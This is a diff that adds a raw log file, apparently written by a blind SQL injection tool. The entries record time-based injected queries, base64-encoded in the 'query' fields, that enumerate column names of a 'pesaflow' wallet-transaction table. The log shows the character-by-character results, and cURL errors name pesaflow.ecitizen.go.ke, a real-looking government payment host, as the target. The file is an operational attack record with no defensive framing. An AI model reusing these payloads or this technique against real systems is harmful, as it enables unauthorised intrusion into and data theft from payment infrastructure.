@@ -1,0 +1,877 @@
+[2023-05-25 04:28:49] Column or table queried is not available!
+        
+    
+        
+[2023-05-25 04:29:17] No result<BR/>
+        
+    
+        
+[2023-05-25 04:34:45] Column or table queried is not available!
+        
+    
+        
+[2023-05-25 04:34:46] Column or table queried is not available!
+        
+    
+        
+[2023-05-25 04:35:04] No result<BR/>
+        
+    
+        
+[2023-05-25 04:35:08] No result<BR/>
+        
+    
+        
+[2023-05-25 04:42:04] No result<BR/>
+        
+    
+        
+[2023-05-25 04:42:04] No result<BR/>
+        
+    
+        
+[2023-05-25 04:42:44] Column or table queried is not available!
+        
+    
+        
+[2023-05-25 04:48:00] No result<BR/>
+        
+    
+        
+[2023-05-25 04:48:51] Column or table queried is not available!
+        
+    
+        
+[2023-05-25 04:49:00] No result<BR/>
+        
+    
+        
+[2023-05-25 04:50:33] No result<BR/>
+        
+    
+        
+[2023-05-25 04:53:50] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":2,"ttcm":"4","f":"C","pr":"NjU=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUxOjMyIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":3,"ttcm":"4","f":"C","pr":"NjUtMTEy","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUyOjA5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":4,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMg==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUyOjU5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":5,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDg=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUzOjQ1In0="}cURL Error: Failed to connect to pesaflow.ecitizen.go.ke port 443 after 4502 ms: Timed out
+        
+    
+        
+[2023-05-25 05:29:06] No result<BR/>
+        
+    
+        
+[2023-05-25 05:29:55] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":2,"ttcm":"4","f":"C","pr":"NzI=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUxOjM3In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":3,"ttcm":"4","f":"C","pr":"NzItMTAx","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUyOjAzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":4,"ttcm":"4","f":"C","pr":"NzItMTAxLTExOA==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUyOjU5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":5,"ttcm":"4","f":"C","pr":"NzItMTAxLTExOC0xMDE=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA0OjUzOjI4In0="}cURL Error: Failed to connect to pesaflow.ecitizen.go.ke port 443 after 4506 ms: Timed out
+        
+    
+        
+[2023-05-25 05:38:51] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":2,"ttcm":"4","f":"C","pr":"NjU=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjMzOjIzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":3,"ttcm":"4","f":"C","pr":"NjUtMTEy","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjMzOjUyIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":4,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMg==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM0OjE4In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":5,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDg=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM0OjQ0In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":6,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM1OjA5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":7,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM1OjI5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":8,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3","query":"eyJjaGFycG9zIjo4LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM1OjQ2In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":9,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNg==","query":"eyJjaGFycG9zIjo5LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM2OjI1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":10,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDU=","query":"eyJjaGFycG9zIjoxMCwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIwNTozNjo0NiJ9"}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":11,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDUtMTEx","query":"eyJjaGFycG9zIjoxMSwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIwNTozNzoxOCJ9"}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":12,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDUtMTExLTU1","query":"eyJjaGFycG9zIjoxMiwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIwNTozODoxMiJ9"}65-112-112-108-105-99-97-116-105-111-55-115
+<br/>05:38:51<br/>Quering done!
+        
+    
+        
+[2023-05-25 05:40:45] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":2,"ttcm":"4","f":"C","pr":"NjU=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM1OjIyIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":3,"ttcm":"4","f":"C","pr":"NjUtMTEy","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM1OjQ3In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":4,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMg==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM2OjIxIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":5,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDg=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM2OjQ0In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":6,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM3OjEzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":7,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM3OjMzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":8,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3","query":"eyJjaGFycG9zIjo4LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM3OjUzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":9,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNg==","query":"eyJjaGFycG9zIjo5LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA1OjM4OjQwIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":10,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDU=","query":"eyJjaGFycG9zIjoxMCwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIwNTozOToxMSJ9"}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":11,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDUtMTEx","query":"eyJjaGFycG9zIjoxMSwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIwNTozOTozOSJ9"}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":12,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5LTk3LTExNi0xMDUtMTExLTExMA==","query":"eyJjaGFycG9zIjoxMiwicGFyYW0iOiIoU0VMRUNUKENPTFVNTl9OQU1FKUZST00oaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMpV0hFUkUodGFibGVfc2NoZW1hPSdwZXNhZmxvdydBTkQodGFibGVfbmFtZT0ndnd0b2RheXdhbGxldHRyeCcpKU9SREVSJTIwQlkoQ09MVU1OX05BTUUpTElNSVQlMjAxJTIwT0ZGU0VUJTIwMSkiLCJ0YXJnZXQiOjEsInNsZWVwIjo1LCJzX3RpbWUiOiIwNTo0MDoxMiJ9"}65-112-112-108-105-99-97-116-105-111-110-115
+<br/>05:40:45<br/>Quering done!
+        
+    
+        
+[2023-05-25 05:43:11] No result<BR/>
+        
+    
+        
+[2023-05-25 05:44:23] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 05:46:09] No result<BR/>
+        
+    
+        
+[2023-05-25 05:46:21] No result<BR/>
+        
+    
+        
+[2023-05-25 05:50:11] No result<BR/>
+        
+    
+        
+[2023-05-25 05:57:02] No result<BR/>
+        
+    
+        
+[2023-05-25 05:57:04] No result<BR/>
+        
+    
+        
+[2023-05-25 06:06:05] No result<BR/>
+        
+    
+        
+[2023-05-25 06:06:24] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":2,"ttcm":"4","f":"C","pr":"ODI=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjAzOjI2In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":3,"ttcm":"4","f":"C","pr":"ODItMTAx","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjAzOjQ1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":4,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOA==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA0OjE5In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":5,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOC0xMDA=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA0OjU1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":6,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOC0xMDAtMTEw","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA1OjIyIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":7,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOC0xMDAtMTEwLTExNw==","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA1OjQ5In0="}82-101-118-100-110-117-101
